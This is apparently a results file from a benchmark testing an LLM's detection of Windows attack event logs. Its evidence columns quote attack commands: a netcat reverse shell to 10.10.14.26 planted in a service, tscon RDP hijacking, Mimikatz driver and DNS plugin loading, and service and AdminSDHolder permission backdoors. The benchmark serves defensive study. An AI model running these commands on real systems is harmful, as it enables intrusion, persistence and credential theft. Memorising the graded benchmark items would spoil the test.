# DETECTION BENCHMARK RESULTS - column glossary
# ----------------------------------------------------------------------
# Model               LLM model id used to score this run
# Filename            Source artifact analyzed (EVTX file or CSV stem)
# Difficulty          Tag from metadata.json: easy / medium / hard
# Test Set            A=Known Pattern, B=Obfuscated, C=Noise-heavy, D=Benign
# Status              processed | error | context_exceeded
# Malicious           Model verdict: YES (attack) or NO (routine/benign)
# Confidence %        Heuristic confidence from response structure quality, not model-stated (0-100)
# Alignment %         Share of cited evidence found verbatim in source (0-100)
# Structure Valid     Response parsed cleanly into the required sections
# Event IDs           Event IDs extracted from the model's EVIDENCE block
# Processes           Process names extracted from the model's EVIDENCE block
# Accounts            Account names extracted from the model's EVIDENCE block
# Commands            Command lines / script blocks extracted from EVIDENCE
# Network             IPs / hostnames / shares extracted from EVIDENCE
# Registry            Registry keys / values extracted from EVIDENCE
# Hallucination %     Share of cited evidence not found in source events (0-100)
# Response Time (s)   Wall-clock seconds from prompt sent to response received
# Extraction (6)      Did the model find the right evidence? (0-6)
# Interpretation (6)  Did it correctly explain what the evidence implies? (0-6)
# NoHallucination (4) 4 = no fabricated evidence, 0 = heavy fabrication
# Reasoning (4)       Quality of the chain of reasoning in EXPLANATION (0-4)
# Total (20)          Sum of the four criteria above (0-20)
# Grade               Letter grade from Total: A>=17, B>=14, C>=10, D<10
# LLM Response        Full raw text the model returned, before any parsing
#
# Skip these lines in pandas:  pd.read_csv(path, comment='#')
# ----------------------------------------------------------------------
Model,Filename,Difficulty,Test Set,Status,Malicious,Confidence %,Alignment %,Structure Valid,Event IDs,Processes,Accounts,Commands,Network,Registry,Hallucination %,Response Time (s),Extraction (6),Interpretation (6),NoHallucination (4),Reasoning (4),Total (20),Grade,LLM Response
claude-opus-4-8,ID4688-sqlcmd tool abuse in SQL Server.evtx,easy,A,processed,NO,100.0,100.0,YES,4688,"SQLCMD.EXE, cmd.exe",admmig,"sqlcmd  -S .\RADAR,2020",,,0.0,3.04,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 4688
- Processes: SQLCMD.EXE, cmd.exe
- Accounts: admmig
- Commands: sqlcmd  -S .\RADAR,2020
- Network: None
- Registry: None

EXPLANATION:
This event shows the account ""admmig"" launching SQLCMD.EXE via cmd.exe to connect to a local SQL Server instance (.\RADAR on port 2020), which is routine database administration activity. There is no evidence of privilege escalation, suspicious command flags, or remote network connections that would indicate malicious behavior."
claude-opus-4-8,ID13-New service for Mimikatz.evtx,easy,A,processed,YES,100.0,83.3,YES,13,C:\Windows\system32\services.exe,,,,"HKLM\System\CurrentControlSet\Services\mimidrv\Start, HKLM\System\CurrentControlSet\Services\mimidrv\ImagePath",0.0,3.92,5.0,6.0,4.0,4,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 13
- Processes: C:\Windows\system32\services.exe
- Accounts: None
- Commands: None
- Network: None
- Registry: HKLM\System\CurrentControlSet\Services\mimidrv\Start, HKLM\System\CurrentControlSet\Services\mimidrv\ImagePath

EXPLANATION:
The logs show services.exe registering a new kernel service named ""mimidrv"" with its ImagePath pointing to mimidrv.sys located in a Mimikatz tools folder. The mimidrv driver is Mimikatz's kernel driver used for privileged operations, and the paired Start/ImagePath registry writes indicate installation of this credential-theft/privilege-escalation tool, which is malicious behavior."
claude-opus-4-8,ID4688-4697 RDP hijack via service creation.evtx,easy,A,processed,YES,100.0,87.5,YES,"1102, 4688, 4697","C:\Windows\System32\sc.exe, C:\Windows\System32\cmd.exe",admmig,"sc.exe  create hijackservice binpath= ""cmd.exe /k tscon 2 /dest:rdp-tcp#5"", cmd.exe /k tscon 2 /dest:rdp-tcp#5",,,0.0,4.25,5.2,6.0,4.0,3,18.2,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688, 4697
- Processes: C:\Windows\System32\sc.exe, C:\Windows\System32\cmd.exe
- Accounts: admmig
- Commands: sc.exe  create hijackservice binpath= ""cmd.exe /k tscon 2 /dest:rdp-tcp#5"", cmd.exe /k tscon 2 /dest:rdp-tcp#5
- Network: None
- Registry: None

EXPLANATION:
The security log was cleared (Event 1102) immediately before creating a service named ""hijackservice"" that runs a tscon command to hijack RDP session 2 to the attacker's session (rdp-tcp#5), a known RDP session hijacking technique executed as LocalSystem. The combination of log clearing for anti-forensics and a malicious service abusing tscon for privilege escalation/session theft is a clear attack pattern."
claude-opus-4-8,ID4688-Command SC to create service on remote host.evtx,easy,A,processed,YES,100.0,80.0,YES,4688,"C:\Windows\System32\sc.exe, C:\Windows\System32\cmd.exe",admmig,"sc  \\fs02\ create hacker-testl binPath=""virus.exe""",\\fs02\,,0.0,4.51,4.8,6.0,4.0,3,17.8,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688
- Processes: C:\Windows\System32\sc.exe, C:\Windows\System32\cmd.exe
- Accounts: admmig
- Commands: sc  \\fs02\ create hacker-testl binPath=""virus.exe""
- Network: \\fs02\
- Registry: None

EXPLANATION:
The sc.exe command creates a remote service on host fs02 with a suspicious service name ""hacker-testl"" pointing to a binary named ""virus.exe"", which is a classic remote service-creation persistence/lateral movement technique. The parent process cmd.exe spawning sc.exe to install a malicious binary as a service strongly indicates attacker behavior rather than routine administration."
claude-opus-4-8,ID4688-Service abuse with Failure Command.evtx,easy,A,processed,YES,100.0,100.0,YES,4688,"C:\Windows\System32\reg.exe, C:\Windows\System32\sc.exe, C:\Windows\System32\cmd.exe",admmig,"REG  ADD ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time"" /v FailureCommand /t REG_SZ /d ""C:\tmp\pentestlab.exe"", sc  failure W32Time command= ""\""c:\Windows\system32\pentestlab.exe\""""",,HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time,0.0,4.86,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688, 4688
- Processes: C:\Windows\System32\reg.exe, C:\Windows\System32\sc.exe, C:\Windows\System32\cmd.exe
- Accounts: admmig
- Commands: REG  ADD ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time"" /v FailureCommand /t REG_SZ /d ""C:\tmp\pentestlab.exe"", sc  failure W32Time command= ""\""c:\Windows\system32\pentestlab.exe\""""
- Network: None
- Registry: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time

EXPLANATION:
The actor admmig modified the W32Time service's recovery/failure configuration to execute a suspicious binary (pentestlab.exe) located in non-standard paths, both via reg.exe setting FailureCommand and via sc.exe failure command. This is a service-failure persistence/privilege-escalation technique where the executable runs when the service fails, and the binary name and location indicate offensive tooling rather than legitimate administration."
claude-opus-4-8,ID4688-Service abuse with malicious path.evtx,easy,A,processed,YES,100.0,93.3,YES,4688,"C:\Windows\System32\sc.exe, C:\Windows\System32\reg.exe, C:\Windows\System32\cmd.exe, C:\Users\admmig\AppData\Local\Microsoft\OneDrive\21.180.0905.0007\FileCoAuth.exe, C:\Windows\System32\svchost.exe","admmig, WIN10-02$","sc  config xboxgip binPath= ""C:\windows\system32\pentestlab.exe"", reg  add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\xboxgip"" /v ImagePath /t REG_SZ /d ""C:\tmp\pentestlab.exe""",,HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\xboxgip,0.0,6.63,5.6,6.0,4.0,4,19.6,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688, 4688, 4688
- Processes: C:\Windows\System32\sc.exe, C:\Windows\System32\reg.exe, C:\Windows\System32\cmd.exe, C:\Users\admmig\AppData\Local\Microsoft\OneDrive\21.180.0905.0007\FileCoAuth.exe, C:\Windows\System32\svchost.exe
- Accounts: admmig, WIN10-02$
- Commands: sc  config xboxgip binPath= ""C:\windows\system32\pentestlab.exe"", reg  add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\xboxgip"" /v ImagePath /t REG_SZ /d ""C:\tmp\pentestlab.exe""
- Network: None
- Registry: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\xboxgip

EXPLANATION:
The account admmig modifies the existing xboxgip service to point its binary path to a suspicious executable named pentestlab.exe, both via sc.exe and a direct registry edit of the service ImagePath. This service binary hijacking to redirect a legitimate service to an attacker-controlled binary is a classic persistence/privilege-escalation technique, and the ""pentestlab"" naming strongly indicates offensive tooling."
claude-opus-4-8,ID4688-Service created (command).evtx,easy,A,processed,YES,100.0,87.5,YES,4688,"C:\Windows\System32\sc.exe, C:\Windows\System32\taskhostex.exe","admmig, FS03$","sc  create hacker-testl3 binPath=""3virus.exe"", taskhostex.exe",,,0.0,4.18,5.2,6.0,4.0,4,19.2,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688, 4688
- Processes: C:\Windows\System32\sc.exe, C:\Windows\System32\taskhostex.exe
- Accounts: admmig, FS03$
- Commands: sc  create hacker-testl3 binPath=""3virus.exe"", taskhostex.exe
- Network: None
- Registry: None

EXPLANATION:
The account admmig used sc.exe to create a new service named ""hacker-testl3"" pointing to a suspicious binary ""3virus.exe,"" a common persistence and privilege-execution technique. The service name and binary path are clear indicators of malicious intent, distinguishing this from legitimate service creation."
claude-opus-4-8,ID4688-Service permissions modified (registry).evtx,easy,A,processed,YES,100.0,100.0,YES,4688,"C:\Windows\System32\reg.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\dllhost.exe, C:\Windows\System32\svchost.exe","admmig, WIN10-02$","reg  add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\XblGameSave\Security"" /v Security /t REG_BINARY /d fe340ead, C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}",,HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\XblGameSave\Security,0.0,6.04,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688, 4688
- Processes: C:\Windows\System32\reg.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\dllhost.exe, C:\Windows\System32\svchost.exe
- Accounts: admmig, WIN10-02$
- Commands: reg  add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\XblGameSave\Security"" /v Security /t REG_BINARY /d fe340ead, C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}
- Network: None
- Registry: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\XblGameSave\Security

EXPLANATION:
The admmig account uses reg.exe spawned from cmd.exe to write a binary Security descriptor value to a service registry key (XblGameSave\Security), a technique used to tamper with service permissions or hide modifications. This is immediately followed by a COM-based dllhost.exe launch (the {AB8902B4...} CLSID is associated with elevation/UAC bypass behavior), indicating a privilege-manipulation chain rather than routine administration."
claude-opus-4-8,ID4688-Service permissions modified (sc).evtx,easy,A,processed,YES,100.0,100.0,YES,4688,"C:\Windows\System32\sc.exe, C:\Windows\System32\cmd.exe",admmig,"sc  sdset xboxgip ""D:(A | CCLCSWRPWPDTLOCRRC | SY)",,,0.0,4.23,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688
- Processes: C:\Windows\System32\sc.exe, C:\Windows\System32\cmd.exe
- Accounts: admmig
- Commands: sc  sdset xboxgip ""D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)
- Network: None
- Registry: None

EXPLANATION:
The use of sc.exe with the ""sdset"" verb modifies the security descriptor (DACL) of the xboxgip service, which is a known technique for service tampering, permission manipulation, or hiding/protecting a service from inspection or stopping. Such security descriptor changes on services are commonly used by attackers for persistence or privilege manipulation rather than routine administration. Spawning from cmd.exe under an admin-style account (""admmig"") with this DACL modification is consistent with malicious service tampering."
claude-opus-4-8,ID4697-New service for Mimikatz.evtx,easy,A,processed,YES,100.0,83.3,YES,"1102, 4697","mimidrv.sys, C:\TOOLS\Security_tool\Mimikatz-fev-2020\mimidrv.sys",admmig,,,,0.0,3.98,5.0,6.0,4.0,4,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4697
- Processes: mimidrv.sys, C:\TOOLS\Security_tool\Mimikatz-fev-2020\mimidrv.sys
- Accounts: admmig
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
The account admmig (logon ID 0xCC3C3) cleared the Security event log (Event 1102) and then installed a kernel-mode service named ""mimidrv"" from a Mimikatz tooling directory (Event 4697), which is the Mimikatz driver used for credential theft and privileged operations. The pairing of log clearing to destroy evidence followed seconds later by deployment of a known credential-dumping driver running as LocalSystem is a clear malicious attack chain."
claude-opus-4-8,ID7045-4697-SMBexec service registration.evtx,easy,A,processed,YES,100.0,87.5,YES,"7045, 4697","%COMSPEC%, execute.bat","LocalSystem, admmig",%COMSPEC% /Q /c echo cd  ^> \\127.0.0.1\C$\__output 2^>^&1 > %TEMP%\execute.bat & %COMSPEC% /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat,"127.0.0.1, \\127.0.0.1\C$\__output",,0.0,4.70,5.2,5.0,4.0,3,17.2,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 7045, 4697
- Processes: %COMSPEC%, execute.bat
- Accounts: LocalSystem, admmig
- Commands: %COMSPEC% /Q /c echo cd  ^> \\127.0.0.1\C$\__output 2^>^&1 > %TEMP%\execute.bat & %COMSPEC% /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat
- Network: 127.0.0.1, \\127.0.0.1\C$\__output
- Registry: None

EXPLANATION:
A service named BTOBTO was created on a domain controller with an ImagePath that runs cmd.exe to write command output to an admin share (\\127.0.0.1\C$\__output) and then deletes the temporary batch file, which is the signature pattern of PsExec-style remote command execution (e.g., Impacket). The use of LocalSystem privileges, output redirection to C$, and self-deleting execute.bat are hallmarks of lateral movement and remote code execution rather than legitimate service installation."
claude-opus-4-8,ID7045-7036 PSexec service installation.evtx,easy,A,processed,YES,100.0,100.0,YES,"104, 7045, 7036","PSEXESVC.exe, PSEXESVC","admmig, LocalSystem",,,,0.0,3.77,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 104, 7045, 7036
- Processes: PSEXESVC.exe, PSEXESVC
- Accounts: admmig, LocalSystem
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
The System event log was cleared (Event 104) by account admmig immediately before the installation of the PSEXESVC service (Event 7045) running as LocalSystem, a strong indicator of remote command execution via PsExec. The combination of log clearing to destroy evidence followed within seconds by a PsExec service install, start, and stop is a classic lateral movement and anti-forensic attack pattern rather than routine administration."
claude-opus-4-8,ID7045-New service for Mimikatz +npcap.evtx,easy,A,processed,YES,100.0,81.8,YES,7045,"test.exe, OfficeClickToRun.exe, MicrosoftSearchInBing.exe, npcap.sys, mimidrv.sys",LocalSystem,"D:\Service\test.exe, ""C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe"" /service, ""C:\Program Files\Microsoft\Microsoft Search in Bing\MicrosoftSearchInBing.exe"", \SystemRoot\system32\DRIVERS\npcap.sys, C:\TOOLS\Security_tool\Mimikatz-fev-2020\mimidrv.sys",,,16.7,6.58,4.9,6.0,3.3,4,18.2,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 7045
- Processes: test.exe, OfficeClickToRun.exe, MicrosoftSearchInBing.exe, npcap.sys, mimidrv.sys
- Accounts: LocalSystem
- Commands: D:\Service\test.exe, ""C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe"" /service, ""C:\Program Files (x86)\Microsoft\Microsoft Search in Bing\MicrosoftSearchInBing.exe"", \SystemRoot\system32\DRIVERS\npcap.sys, C:\TOOLS\Security_tool\Mimikatz-fev-2020\mimidrv.sys
- Network: None
- Registry: None

EXPLANATION:
The installation of the ""mimikatz driver (mimidrv)"" kernel-mode driver from C:\TOOLS\Security_tool\Mimikatz-fev-2020\mimidrv.sys is a strong indicator of credential-dumping/privilege escalation activity. The earlier generically-named ""WCESERVICE"" pointing to D:\Service\test.exe is also suspicious. While Office Click-to-Run, Bing search, and Npcap are legitimate, the mimikatz driver installation confirms malicious tooling on jump01.offsec.lan."
claude-opus-4-8,ID7045-Random service installation.evtx,easy,A,processed,YES,100.0,83.3,YES,"104, 7045",virusé.exe,"admmig, LocalSystem",,,,0.0,6.96,5.0,6.0,4.0,4,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 104, 7045
- Processes: virusé.exe
- Accounts: admmig, LocalSystem
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
The System event log was cleared (Event ID 104) by account admmig, immediately followed by the installation of a new service named ""bad-task"" with image path ""virusé.exe"" running as LocalSystem (Event ID 7045). The combination of log clearing to destroy forensic evidence followed within seconds by a suspiciously named service executing a suspicious binary with SYSTEM privileges is a strong indicator of malicious activity and defense evasion."
claude-opus-4-8,ID800-4103-4104-Service abuse with Failure Command.evtx,easy,A,processed,YES,100.0,50.0,YES,"800, 4103, 4104","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\nc.exe, powershell.exe",OFFSEC\admmig,"Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\xboxgip -name FailureCommand -value ""C:\nc.exe -e powershell.exe 10.10.14.26 4447"", Microsoft.PowerShell.Core\Set-StrictMode -Off",10.10.14.26 4447,HKLM:\System\CurrentControlSet\services\xboxgip,0.0,4.71,3.0,6.0,4.0,4,17.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 800, 4103, 4104
- Processes: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\nc.exe, powershell.exe
- Accounts: OFFSEC\admmig
- Commands: Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\xboxgip -name FailureCommand -value ""C:\nc.exe -e powershell.exe 10.10.14.26 4447"", Microsoft.PowerShell.Core\Set-StrictMode -Off
- Network: 10.10.14.26 4447
- Registry: HKLM:\System\CurrentControlSet\services\xboxgip

EXPLANATION:
The user OFFSEC\admmig modified the xboxgip service's FailureCommand registry value to execute a netcat reverse shell (nc.exe -e powershell.exe) back to 10.10.14.26 on port 4447. This is a clear persistence and command-and-control technique abusing service recovery actions to launch an attacker-controlled reverse shell."
claude-opus-4-8,ID800-4103-4104-Service abuse with malicious path.evtx,easy,A,processed,YES,100.0,83.3,YES,"800, 4103, 4104","powershell.exe, nc.exe",OFFSEC\admmig,"Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\xboxgip -name ImagePath -value ""C:\nc.exe -e powershell.exe 10.10.14.26 4447""",10.10.14.26,HKLM:\System\CurrentControlSet\services\xboxgip,0.0,4.80,5.0,6.0,4.0,4,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 800, 4103, 4104
- Processes: powershell.exe, nc.exe
- Accounts: OFFSEC\admmig
- Commands: Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\xboxgip -name ImagePath -value ""C:\nc.exe -e powershell.exe 10.10.14.26 4447""
- Network: 10.10.14.26
- Registry: HKLM:\System\CurrentControlSet\services\xboxgip

EXPLANATION:
The user OFFSEC\admmig modified the ImagePath of the xboxgip service to launch netcat (nc.exe) with a PowerShell reverse shell connecting to 10.10.14.26 on port 4447. This is a clear service-hijacking persistence/execution technique combined with a reverse shell payload, which is malicious. Legitimate administration would not point a service's ImagePath at netcat executing PowerShell to an external IP."
claude-opus-4-8,ID800-4103-4104-Service creation (PowerShell).evtx,easy,B,processed,YES,100.0,62.5,YES,"800, 4104, 4103","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, virus.exe",OFFSEC\admmig,"New-Service -Name ""hackervirus"" -BinaryPathName '""virus.exe""'",,,0.0,3.98,3.8,6.0,4.0,4,17.8,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 800, 4104, 4103
- Processes: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, virus.exe
- Accounts: OFFSEC\admmig
- Commands: New-Service -Name ""hackervirus"" -BinaryPathName '""virus.exe""'
- Network: None
- Registry: None

EXPLANATION:
The account OFFSEC\admmig used PowerShell to create a new Windows service named ""hackervirus"" pointing to a suspicious binary ""virus.exe"", a common persistence and privilege-escalation technique. The naming of the service and binary, combined with service creation via PowerShell, strongly indicates malicious intent rather than legitimate administration."
claude-opus-4-8,ID13-WMIimplant registry crash control.evtx,easy,A,processed,YES,100.0,71.7,YES,13,"C:\Windows\system32\services.exe, C:\Windows\system32\wbem\wmiprvse.exe",,,"10.23.42.38, 10.23.42.1, 10.23.42.10, 10.23.42.11","HKLM\System\CurrentControlSet\Services\hacker23\Start, HKLM\System\CurrentControlSet\Services\hacker23\ImagePath, HKLM\System\CurrentControlSet\Control\CrashControl\DumpFile",66.7,36.65,4.3,6.0,1.3,4,15.6,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 13
- Processes: C:\Windows\system32\services.exe, C:\Windows\system32\wbem\wmiprvse.exe
- Accounts: None
- Commands: None
- Network: 10.23.42.38, 10.23.42.1, 10.23.42.10, 10.23.42.11
- Registry: HKLM\System\CurrentControlSet\Services\hacker23\Start, HKLM\System\CurrentControlSet\Services\hacker23\ImagePath, HKLM\System\CurrentControlSet\Control\CrashControl\DumpFile

EXPLANATION:
A new service named ""hacker23"" was created via services.exe with an auto-start value and a suspicious ImagePath, indicating persistence/service creation. WMI (wmiprvse.exe, T1047) was used to manipulate CrashControl registry values, and the DumpFile value was abused to store the encoded output of an ipconfig /all command (host fs03vuln, IP 10.23.42.38), reflecting reconnaissance data exfiltration through registry abuse. The combination of suspicious service creation and WMI-based registry tampering carrying recon output is consistent with attacker activity."
claude-opus-4-8,ID19-20-WMI registration via PowerLurk.evtx,easy,A,processed,YES,100.0,100.0,YES,"20, 19","cmd.exe, notepad.exe",OFFSEC\admmig,"""cmd.exe /c echo %ProcessId% >> c:\\\\temp\\\\log.txt""",,,0.0,4.73,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 20, 19
- Processes: cmd.exe, notepad.exe
- Accounts: OFFSEC\admmig
- Commands: ""cmd.exe /c echo %ProcessId% >> c:\\\\temp\\\\log.txt""
- Network: None
- Registry: None

EXPLANATION:
This shows the creation of a WMI permanent event subscription, with both a WmiConsumerEvent (Event ID 20) binding a CommandLine consumer named ""Evil"" to launch cmd.exe, and a matching WmiFilterEvent (Event ID 19) triggering on notepad.exe process start. This paired Filter/Consumer setup under the technique T1047 (WMI) is a classic persistence and event-triggered execution mechanism. The ""Evil"" naming, suspicious command writing to c:\temp\log.txt, and the privileged account combine to indicate malicious WMI-based persistence rather than routine administration."
claude-opus-4-8,ID4688-netsh helper DLL.evtx,easy,A,processed,YES,100.0,100.0,YES,"1102, 4688","netsh.exe, cmd.exe, mimikatz.exe",admmig,netsh  add helper  mimikatz.exe,,,0.0,3.69,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688
- Processes: netsh.exe, cmd.exe, mimikatz.exe
- Accounts: admmig
- Commands: netsh  add helper  mimikatz.exe
- Network: None
- Registry: None

EXPLANATION:
The account admmig cleared the Security event log (Event 1102) and seconds later spawned netsh.exe from cmd.exe to load mimikatz.exe as a netsh helper DLL, a known credential-theft and persistence technique. The combination of log clearing for anti-forensics followed by loading the mimikatz tooling indicates a deliberate attack rather than routine administration."
claude-opus-4-8,ID5136-AdminSDholder backdoor obfuscation (via localizationDisplayId).evtx,easy,B,processed,NO,100.0,50.0,YES,5136,,admmig,,"rootdc1.offsec.lan, offsec.lan",,0.0,4.50,3.0,1.0,4.0,2,10.0,C,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 5136
- Processes: None
- Accounts: admmig
- Commands: None
- Network: rootdc1.offsec.lan, offsec.lan
- Registry: None

EXPLANATION:
These events show directory service modifications to the localizationDisplayId attribute of the User-Force-Change-Password extended-rights configuration object, with paired value/operation changes that appear to be routine configuration adjustments. The modifications come from a single admin account (admmig) on the domain controller and involve only display/localization metadata rather than actual permission grants or password resets. There is no privilege escalation chain, no DACL change, or sequential attack pattern indicating malicious behavior."
claude-opus-4-8,ID5136-AdminSDholder permissions changed.evtx,easy,A,processed,YES,100.0,50.0,YES,5136,,"admmig, OFFSEC",,,,0.0,5.28,3.0,6.0,4.0,3,16.0,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 5136
- Processes: None
- Accounts: admmig, OFFSEC
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
The AdminSDHolder object's nTSecurityDescriptor (CN=AdminSDHolder,CN=System,DC=offsec,DC=lan) was modified by account admmig, and comparing the two ACL values shows a new full-control ACE granted to SID S-1-5-21-4230534742-2542757381-3142984815-1234 (A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO) that was not present before. This is a classic AdminSDHolder persistence/privilege-escalation technique, as SDProp propagates these permissions to all protected/privileged accounts, granting the attacker durable control over domain admin objects."
claude-opus-4-8,ID12-LSA Protect mode enabled RunAsPPL.evtx,easy,D,processed,NO,100.0,100.0,YES,"14, 12",,,,,,0.0,3.54,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 14, 12
- Processes: None
- Accounts: None
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
These are routine Microsoft-Windows-Wininit system events (Event IDs 14 and 12) related to standard boot/initialization configuration on WIN10-client01.offsec.lan. There are no suspicious processes, commands, accounts, or network indicators present, indicating normal system startup activity."
claude-opus-4-8,ID4664-symbolic link created.evtx,easy,A,processed,NO,100.0,100.0,YES,4664,,Admin,,,,0.0,2.82,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 4664
- Processes: None
- Accounts: Admin
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
Event ID 4664 indicates a hard link was created for the file sysmonconf.xml by the Admin account within the user's own Downloads directory. This is routine file system activity consistent with managing a Sysmon configuration file and shows no signs of privilege escalation, malicious commands, or network indicators."
claude-opus-4-8,ID150-Failed DLL loaded by DNS server.evtx,easy,A,processed,YES,100.0,100.0,YES,150,mimilib.dll,,,rootdc1.offsec.lan,,0.0,4.02,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 150
- Processes: mimilib.dll
- Accounts: None
- Commands: None
- Network: rootdc1.offsec.lan
- Registry: None

EXPLANATION:
DNS Server Event ID 150 indicates the DNS service failed to load or encountered an error related to a server-level plugin DLL (.\mimilib.dll). The mimilib.dll file is a known Mimikatz component abused for DNS server plugin DLL persistence on domain controllers, allowing attackers to execute malicious code via the DNS service. The repeated loading attempts on the domain controller rootdc1.offsec.lan strongly indicate malicious DLL-based persistence rather than legitimate DNS configuration."
claude-opus-4-8,ID4688-DNS DLL serverlevelplugindll command.evtx,easy,A,processed,YES,100.0,100.0,YES,4688,"dnscmd.exe, cmd.exe, mimilib.dll",admmig,"dnscmd.exe  /config /serverlevelplugindll ""C:\TOOLS\Mimikatz-fev-2020\mimilib.dll""",,,0.0,3.81,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688
- Processes: dnscmd.exe, cmd.exe, mimilib.dll
- Accounts: admmig
- Commands: dnscmd.exe  /config /serverlevelplugindll ""C:\TOOLS\Mimikatz-fev-2020\mimilib.dll""
- Network: None
- Registry: None

EXPLANATION:
The dnscmd.exe command registers a serverlevelplugindll pointing to mimilib.dll from a Mimikatz tools directory, a well-known DNS server plugin DLL injection technique used for code execution and persistence on domain controllers. The activity occurs on a domain controller (rootdc1.offsec.lan) and loads an attacker-staged DLL, which is clearly malicious rather than routine DNS administration."
